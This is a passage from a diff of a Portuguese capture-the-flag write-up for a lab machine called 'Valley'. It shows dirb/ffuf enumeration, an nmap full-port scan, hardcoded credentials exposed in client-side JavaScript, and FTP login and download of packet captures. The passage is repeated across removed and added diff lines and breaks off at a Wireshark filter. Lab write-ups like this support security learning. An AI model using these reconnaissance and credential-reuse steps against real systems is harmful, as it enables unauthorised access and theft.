-</span></span><span class=line><span class=cl><span class=nx>loginButton</span><span class=p>.</span><span class=nx>style</span><span class=p>.</span><span class=nx>borderRadius</span> <span class=o>=</span> <span class=s1>&#39;5px&#39;</span><span class=p>;</span>
-</span></span><span class=line><span class=cl><span class=nx>loginButton</span><span class=p>.</span><span class=nx>style</span><span class=p>.</span><span class=nx>color</span> <span class=o>=</span> <span class=s1>&#39;#fff&#39;</span><span class=p>;</span>
-</span></span><span class=line><span class=cl><span class=nx>loginButton</span><span class=p>.</span><span class=nx>style</span><span class=p>.</span><span class=nx>cursor</span> <span class=o>=</span> <span class=s1>&#39;pointer&#39;</span><span class=p>;</span>
-</span></span><span class=line><span class=cl><span class=nx>loginButton</span><span class=p>.</span><span class=nx>style</span><span class=p>.</span><span class=nx>padding</span> <span class=o>=</span> <span class=s1>&#39;10px&#39;</span><span class=p>;</span>
-</span></span><span class=line><span class=cl><span class=nx>loginButton</span><span class=p>.</span><span class=nx>style</span><span class=p>.</span><span class=nx>marginTop</span> <span class=o>=</span> <span class=s1>&#39;10px&#39;</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>isValidUsername</span><span class=p>(</span><span class=nx>username</span><span class=p>)</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=nx>username</span><span class=p>.</span><span class=nx>length</span> <span class=o>&lt;</span> <span class=mi>5</span><span class=p>)</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>	<span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s2>&#34;Username is valid&#34;</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>	<span class=p>}</span>
-</span></span><span class=line><span class=cl>	<span class=k>else</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>	<span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s2>&#34;Invalid Username&#34;</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>	<span class=p>}</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>isValidPassword</span><span class=p>(</span><span class=nx>password</span><span class=p>)</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=nx>password</span><span class=p>.</span><span class=nx>length</span> <span class=o>&lt;</span> <span class=mi>7</span><span class=p>)</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>        <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s2>&#34;Password is valid&#34;</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>        <span class=p>}</span>
-</span></span><span class=line><span class=cl>        <span class=k>else</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>        <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s2>&#34;Invalid Password&#34;</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>        <span class=p>}</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>showErrorMessage</span><span class=p>(</span><span class=nx>element</span><span class=p>,</span> <span class=nx>message</span><span class=p>)</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>error</span> <span class=o>=</span> <span class=nx>element</span><span class=p>.</span><span class=nx>parentElement</span><span class=p>.</span><span class=nx>querySelector</span><span class=p>(</span><span class=s1>&#39;.error&#39;</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>  <span class=nx>error</span><span class=p>.</span><span class=nx>textContent</span> <span class=o>=</span> <span class=nx>message</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>  <span class=nx>error</span><span class=p>.</span><span class=nx>style</span><span class=p>.</span><span class=nx>display</span> <span class=o>=</span> <span class=s1>&#39;block&#39;</span><span class=p>;</span>
-</span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=nx>loginButton</span><span class=p>.</span><span class=nx>addEventListener</span><span class=p>(</span><span class=s2>&#34;click&#34;</span><span class=p>,</span> <span class=p>(</span><span class=nx>e</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>    <span class=nx>e</span><span class=p>.</span><span class=nx>preventDefault</span><span class=p>();</span>
-</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>username</span> <span class=o>=</span> <span class=nx>loginForm</span><span class=p>.</span><span class=nx>username</span><span class=p>.</span><span class=nx>value</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>password</span> <span class=o>=</span> <span class=nx>loginForm</span><span class=p>.</span><span class=nx>password</span><span class=p>.</span><span class=nx>value</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>username</span> <span class=o>===</span> <span class=s2>&#34;siemDev&#34;</span> <span class=o>&amp;&amp;</span> <span class=nx>password</span> <span class=o>===</span> <span class=s2>&#34;california&#34;</span><span class=p>)</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>        <span class=nb>window</span><span class=p>.</span><span class=nx>location</span><span class=p>.</span><span class=nx>href</span> <span class=o>=</span> <span class=s2>&#34;/dev1243224123123/devNotes37370.txt&#34;</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>        <span class=nx>loginErrorMsg</span><span class=p>.</span><span class=nx>style</span><span class=p>.</span><span class=nx>opacity</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=p>}</span>
-</span></span><span class=line><span class=cl><span class=p>})</span>
-</span></span></code></pre></div><p>Neste caso, temos a estilização do botão de login, uma função de validação de username mostrando as características necessárias para o username ser válido, sendo menor do que 5 caracteres e o campo de senha, no caso o password que realiza a validação da senha, neste se faz necessário uma senha com menos de 7 caracteres para ser válido. Entretanto, a informação mais importante é a exposição do username <strong>siemDev</strong> e senha <strong>california</strong>, além de mais uma nota deixada de forma aleatória pelo dev da Valley em um arquivo de texto <strong>/dev1243224123123/devNotes37370.txt</strong>.</p><p>No /button.js temos a animação e estilização do botão login.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kr>const</span> <span class=nx>button</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s2>&#34;homeButton&#34;</span><span class=p>);</span> <span class=c1>// Get the button element
-</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kd>let</span> <span class=nx>isAnimating</span> <span class=o>=</span> <span class=kc>false</span><span class=p>;</span> <span class=c1>// Set initial animation state
-</span></span></span><span class=line><span class=cl><span class=c1></span>
-</span></span><span class=line><span class=cl><span class=nx>button</span><span class=p>.</span><span class=nx>addEventListener</span><span class=p>(</span><span class=s2>&#34;click&#34;</span><span class=p>,</span> <span class=kd>function</span><span class=p>()</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>isAnimating</span><span class=p>)</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>    <span class=nx>isAnimating</span> <span class=o>=</span> <span class=kc>true</span><span class=p>;</span> <span class=c1>// Set animation state to true
-</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nx>button</span><span class=p>.</span><span class=nx>style</span><span class=p>.</span><span class=nx>transform</span> <span class=o>=</span> <span class=s2>&#34;scale(1.2)&#34;</span><span class=p>;</span> <span class=c1>// Animate button size
-</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nx>button</span><span class=p>.</span><span class=nx>style</span><span class=p>.</span><span class=nx>opacity</span> <span class=o>=</span> <span class=mf>0.5</span><span class=p>;</span> <span class=c1>// Animate button opacity
-</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nx>setTimeout</span><span class=p>(</span><span class=kd>function</span><span class=p>()</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>      <span class=nx>button</span><span class=p>.</span><span class=nx>style</span><span class=p>.</span><span class=nx>transform</span> <span class=o>=</span> <span class=s2>&#34;scale(1)&#34;</span><span class=p>;</span> <span class=c1>// Reset button size
-</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=nx>button</span><span class=p>.</span><span class=nx>style</span><span class=p>.</span><span class=nx>opacity</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span> <span class=c1>// Reset button opacity
-</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=nx>isAnimating</span> <span class=o>=</span> <span class=kc>false</span><span class=p>;</span> <span class=c1>// Set animation state back to false
-</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=p>},</span> <span class=mi>1000</span><span class=p>);</span> <span class=c1>// Animation duration in milliseconds
-</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=p>}</span>
-</span></span><span class=line><span class=cl>  <span class=nb>window</span><span class=p>.</span><span class=nx>location</span><span class=p>.</span><span class=nx>href</span> <span class=o>=</span> <span class=s2>&#34;/index.html&#34;</span><span class=p>;</span>
-</span></span><span class=line><span class=cl><span class=p>});</span>
-</span></span></code></pre></div><p>Voltando para as informações mais importantes, no caminho <strong>/dev1243224123123/devNotes37370.txt</strong> se tem mais uma ideia do primeiro caminho a ser tomado e uma etapa bem importante.</p><p><img alt=devNotes37370.txt src=https://dev-to-uploads.s3.amazonaws.com/uploads/articles/tleu8yk5galmxb9dlmab.png>
-O primeiro ponto é que essa pessoa costuma reusar as credenciais, a única credencial que foi capturada é a <strong>siemDev</strong> e isso significa que a mesma serve para a porta ftp dessa aplicação. No entanto, não se sabe qual seria a porta ftp, apesar da nota setar para essa possível resposta por não estar em seu &ldquo;valor&rdquo; usual, para isso o <strong>nmap</strong> se faz necessário para tentar localizá-la e também verificar as outras portas disponíveis.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nmap -v -p- alvo
-</span></span></code></pre></div><p><img alt=nmap src=https://dev-to-uploads.s3.amazonaws.com/uploads/articles/eet5qmuf6iqoggx47nne.png>
-A porta ftp é justamente a porta <strong>37370</strong>, informada para o dev e que está referenciada na nota da rota <strong>/devNotes37370.txt</strong> . Com isso, apenas se faz necessário nesse momento realizar a conexão e adentrar a próxima etapa do ciclo do ataque.</p><h3 id=initial-compromise-e-establish-foothold>Initial Compromise e Establish Foothold</h3><hr><p>A partir do momento em que o invasor realiza esse tipo de ação e consegue o feito de obter acesso ao ftp, já temos ali um <strong>initial compromise</strong> (comprometimento inicial) da aplicação, ainda que não seja o objetivo ideal é justamente a partir desse princípio que terá a possibilidade de realizar uma elevação de privilégios por exemplo. Quando se pensa na etapa do <strong>establish foothold</strong> (estabelecimento do ponto de apoio) é necessário algo que mantenha esse acesso. Nessa máquina em questão, a manutenção desse acesso se deu pela captura de pacotes de tráfego da rede, realizando a filtragem e análise desses pacotes com <strong>Wireshark</strong> ou <strong>tcpdump</strong>, em busca de credenciais que possam preservar esse acesso.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ftp <span class=o>[</span>ip<span class=o>]</span> <span class=o>[</span>port<span class=o>]</span>
-</span></span><span class=line><span class=cl>ftp 00.00.000.00 <span class=m>37370</span>
-</span></span></code></pre></div><p><img alt="acesso ao ftp" src=https://dev-to-uploads.s3.amazonaws.com/uploads/articles/80ytv2tast0wrsd1ecrd.png>
-Agora a questão é o que se tem ali e o que pode ser verificado? algo que possa ir contribuindo para o ciclo de ataque do intruso? Exatamente os pacotes de captura de tráfego, na porta ftp.</p><p><img alt="pacotes de captura de tráfego" src=https://dev-to-uploads.s3.amazonaws.com/uploads/articles/53qjko0xmha10cs70frg.png>
-E o que foi feito no terminal acima? Primeiramente, a conexão com ftp, colocando as credenciais que foram adquiridas, usando o comando ls para verificar os arquivos ali presentes e por fim o comando mget * para capturar esses arquivos do ftp para a própria máquina, podendo assim realizar uma analisa melhor desses pacotes. Caso tenha interesse, nesse site possui informações sobre os <a href=https://www.cs.colostate.edu/helpdocs/ftp.html>comandos básicos do ftp</a>.</p><h4 id=wireshark>Wireshark</h4><hr><pre tabindex=0><code class=language-wireshark data-lang=wireshark>(http.request or tls.handshake.type eq 1) and !(ssdp)   
+No gallery.html temos algumas imagens que fazem parte também da rota <strong>/static/</strong> de armazenamento de arquivos e que vai &ldquo;<strong>hipoteticamente</strong>&rdquo; do 1 até até o 18.</p>
+<p><img alt="Galeria de imagens" src="https://dev-to-uploads.s3.amazonaws.com/uploads/articles/8yr30ytf7eecxmgsrved.png"></p>
+<p><img alt="Rota /static e imagem 1" src="https://dev-to-uploads.s3.amazonaws.com/uploads/articles/b80wd2plq37h99f2tnu4.png">
+Enquanto no /pricing.html temos as informações dos valores cobrados pela empresa Valley e informações em uma nota misteriosa se for digitado apenas o IP do alvo + rota /pricing e que informa sobre uma pessoa chamada  RP que solicita  a J para parar de deixar notas em lugares aleatórios do website. Essa informação deduz que provavelmente terá informações expostas sobre a aplicação em algum lugar e que para isso teremos que usar alguma ferramenta para encontrá-las.</p>
+<p><img alt="Rota pricing" src="https://dev-to-uploads.s3.amazonaws.com/uploads/articles/lvgnxcmvrbccuh17bhqa.png"></p>
+<p><img alt="Index da rota pricing" src="https://dev-to-uploads.s3.amazonaws.com/uploads/articles/k1e4djv7qart7mew7mwr.png"></p>
+<p><img alt="Nota.txt" src="https://dev-to-uploads.s3.amazonaws.com/uploads/articles/imswizmzjewzo73p2vue.png">
+Além disso, podemos presumir que a linguagem que está sendo executada nessa aplicação é <strong>Javascript</strong> em virtude do que foi visto no inspect da aplicação e no próprio html.</p>
+<p><img alt="inspect" src="https://dev-to-uploads.s3.amazonaws.com/uploads/articles/65se3egrvrsreggffp31.png"></p>
+<h3 id="ferramentas">Ferramentas</h3>
+<hr>
+<p>Com a finalização de um reconhecimento inicial mais simples, buscando informações próprias no alvo, iremos partir para a utilização de ferramentas como <strong>dirb</strong>, <strong>ffuf</strong>, etc., que possam primeiramente verificar as rotas, ou seja, uma <strong>enumeração</strong>, para coletar informações sobre a aplicação, identificar as rotas que estão disponíveis, diretórios, qualquer informação oculta que possa contribuir no entendimento do alvo e formas de entrada para um ataque.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">dirb http://alvo/ /usr/share/wordlists/dirb/common.txt
+</span></span><span class="line"><span class="cl">dirb http://alvo/pricing /usr/share/wordlists/dirb/common.txt
+</span></span><span class="line"><span class="cl">dirb http://alvo/gallery /usr/share/wordlists/dirb/common.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">ffuf -w /usr/share/wordlists/dirb/common.txt -u http://alvo/FUZZ
+</span></span><span class="line"><span class="cl">ffuf -w /usr/share/wordlists/dirb/common.txt -u http://alvo/pricing/FUZZ
+</span></span><span class="line"><span class="cl">ffuf -w /usr/share/wordlists/dirb/common.txt -u http://alvo/gallery/FUZZ
+</span></span></code></pre></div><p>A principal informação estará justamente na rota /static.</p>
+<p><img alt="Ferramenta dirb" src="https://dev-to-uploads.s3.amazonaws.com/uploads/articles/srqnd41976txsnif776t.png"></p>
+<p><img alt="Ferramenta ffuf" src="https://dev-to-uploads.s3.amazonaws.com/uploads/articles/hwb45nvvbmmvkx5ktb5e.png"></p>
+<p><img alt="dev notes" src="https://dev-to-uploads.s3.amazonaws.com/uploads/articles/lvh6jnthqa3fypwm4ce0.png">
+Aqui temos informações não muito usuais e que confirma a <strong>note.txt</strong> de que teríamos uma nota perdida em algum lugar e é justamente a rota <strong>/static/00</strong> que possui essa nota.  Alguns detalhes podem ser analisados aqui, primeiramente por serem tarefas destinadas a um dev da Valley e que foram solicitadas por outro com user ou referenciado por valleyDev. Dentre essas informações podemos tirar como principal o endereço de login <strong>/dev1243224123123</strong>, que não foi removido pela pessoa e consequentemente estaria no ar ainda.</p>
+<p><img alt="Tela de login" src="https://dev-to-uploads.s3.amazonaws.com/uploads/articles/r4411vmt4fed1wbkft28.png">
+Usando as próprias ferramentas do navegador, que é o inspect e a análise da rede podemos tirar mais duas rotas que confirmam a utilização de <strong>Javascript</strong> na aplicação. Se tentar usar as ferramentas anteriores terá dificuldade e provavelmente não irá setar essas rotas disponíveis.</p>
+<p><img alt="Inspect - Network" src="https://dev-to-uploads.s3.amazonaws.com/uploads/articles/v7eefpo6cg5htbtlp9ps.png"></p>
+<p>Na rota /dev.js teremos um código bastante interessante:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">loginForm</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;login-form&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">loginButton</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;login-form-submit&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">loginErrorMsg</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;login-error-msg&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">loginForm</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">border</span> <span class="o">=</span> <span class="s1">&#39;2px solid #ccc&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">loginForm</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">padding</span> <span class="o">=</span> <span class="s1">&#39;20px&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">loginButton</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">backgroundColor</span> <span class="o">=</span> <span class="s1">&#39;#007bff&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">loginButton</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">border</span> <span class="o">=</span> <span class="s1">&#39;none&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">loginButton</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">borderRadius</span> <span class="o">=</span> <span class="s1">&#39;5px&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">loginButton</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">color</span> <span class="o">=</span> <span class="s1">&#39;#fff&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">loginButton</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">cursor</span> <span class="o">=</span> <span class="s1">&#39;pointer&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">loginButton</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">padding</span> <span class="o">=</span> <span class="s1">&#39;10px&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">loginButton</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">marginTop</span> <span class="o">=</span> <span class="s1">&#39;10px&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">isValidUsername</span><span class="p">(</span><span class="nx">username</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">if</span><span class="p">(</span><span class="nx">username</span><span class="p">.</span><span class="nx">length</span> <span class="o">&lt;</span> <span class="mi">5</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;Username is valid&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;Invalid Username&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">isValidPassword</span><span class="p">(</span><span class="nx">password</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">if</span><span class="p">(</span><span class="nx">password</span><span class="p">.</span><span class="nx">length</span> <span class="o">&lt;</span> <span class="mi">7</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;Password is valid&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;Invalid Password&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">showErrorMessage</span><span class="p">(</span><span class="nx">element</span><span class="p">,</span> <span class="nx">message</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">error</span> <span class="o">=</span> <span class="nx">element</span><span class="p">.</span><span class="nx">parentElement</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s1">&#39;.error&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">error</span><span class="p">.</span><span class="nx">textContent</span> <span class="o">=</span> <span class="nx">message</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">error</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">display</span> <span class="o">=</span> <span class="s1">&#39;block&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">loginButton</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s2">&#34;click&#34;</span><span class="p">,</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">e</span><span class="p">.</span><span class="nx">preventDefault</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">username</span> <span class="o">=</span> <span class="nx">loginForm</span><span class="p">.</span><span class="nx">username</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">password</span> <span class="o">=</span> <span class="nx">loginForm</span><span class="p">.</span><span class="nx">password</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">username</span> <span class="o">===</span> <span class="s2">&#34;siemDev&#34;</span> <span class="o">&amp;&amp;</span> <span class="nx">password</span> <span class="o">===</span> <span class="s2">&#34;california&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="s2">&#34;/dev1243224123123/devNotes37370.txt&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">loginErrorMsg</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">opacity</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">})</span>
+</span></span></code></pre></div><p>Neste caso, temos a estilização do botão de login, uma função de validação de username mostrando as características necessárias para o username ser válido, sendo menor do que 5 caracteres e o campo de senha, no caso o password que realiza a validação da senha, neste se faz necessário uma senha com menos de  7 caracteres para ser válido. Entretanto, a informação mais importante é a exposição do username <strong>siemDev</strong> e senha <strong>california</strong>, além de mais uma nota deixada de forma aleatória pelo dev da Valley em um arquivo de texto <strong>/dev1243224123123/devNotes37370.txt</strong>.</p>
+<p>No /button.js temos a animação e estilização do botão  login.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">button</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;homeButton&#34;</span><span class="p">);</span> <span class="c1">// Get the button element
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">let</span> <span class="nx">isAnimating</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span> <span class="c1">// Set initial animation state
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="nx">button</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s2">&#34;click&#34;</span><span class="p">,</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isAnimating</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">isAnimating</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span> <span class="c1">// Set animation state to true
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">button</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">transform</span> <span class="o">=</span> <span class="s2">&#34;scale(1.2)&#34;</span><span class="p">;</span> <span class="c1">// Animate button size
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">button</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">opacity</span> <span class="o">=</span> <span class="mf">0.5</span><span class="p">;</span> <span class="c1">// Animate button opacity
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">button</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">transform</span> <span class="o">=</span> <span class="s2">&#34;scale(1)&#34;</span><span class="p">;</span> <span class="c1">// Reset button size
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nx">button</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">opacity</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="c1">// Reset button opacity
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nx">isAnimating</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span> <span class="c1">// Set animation state back to false
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">},</span> <span class="mi">1000</span><span class="p">);</span> <span class="c1">// Animation duration in milliseconds
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="s2">&#34;/index.html&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span></code></pre></div><p>Voltando para as informações mais importantes, no caminho <strong>/dev1243224123123/devNotes37370.txt</strong> se tem mais uma ideia do primeiro caminho a ser tomado e uma etapa bem importante.</p>
+<p><img alt="devNotes37370.txt" src="https://dev-to-uploads.s3.amazonaws.com/uploads/articles/tleu8yk5galmxb9dlmab.png">
